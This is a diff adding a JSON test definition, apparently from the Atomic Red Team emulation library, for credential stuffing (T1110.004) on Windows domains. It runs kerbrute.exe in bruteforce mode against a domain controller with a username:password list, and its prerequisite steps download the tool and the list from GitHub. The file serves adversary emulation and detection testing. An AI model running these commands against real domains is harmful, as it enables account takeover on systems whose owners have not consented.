@@ -1,0 +1,47 @@
+{
+    "name": "Brute Force:Credential Stuffing using Kerbrute Tool",
+    "description": "Will read username and password combos from a file or stdin (format username:password) and perform a bruteforce attack ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "command": "cd \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n.\\kerbrute.exe bruteforce --dc #{domaincontroller} -d #{domain} \"PathToAtomicsFolder\\..\\ExternalPayloads\\bruteforce.txt\"      \n",
+        "type": "Command Executor"
+    },
+    "id": "T1110.004",
+    "tactics": [
+        "Credential Access"
+    ],
+    "technique": "Credential Stuffing",
+    "source": "ART",
+    "uuid": "4852c630-87a9-409b-bb5e-5dc12c9ebcde",
+    "arguments": {
+        "domaincontroller": {
+            "description": "Domain controller where test will be run",
+            "type": "string",
+            "default": "$ENV:userdnsdomain"
+        },
+        "domain": {
+            "description": "Domain where you will be testing",
+            "type": "string",
+            "default": "$ENV:userdomain"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "kerbrute.exe must exist in PathToAtomicsFolder\\..\\ExternalPayloads\n",
+            "prereq_command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\kerbrute.exe\"){exit 0} else {exit 1}\n",
+            "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\kerbrute.exe\"\n"
+        },
+        {
+            "description": "bruteforce.txt must exist in PathToAtomicsFolder\\..\\ExternalPayloads\n",
+            "prereq_command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\bruteforce.txt\"){exit 0} else {exit 1}\n",
+            "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.004/src/bruteforce.txt?raw=true\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\bruteforce.txt\"\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
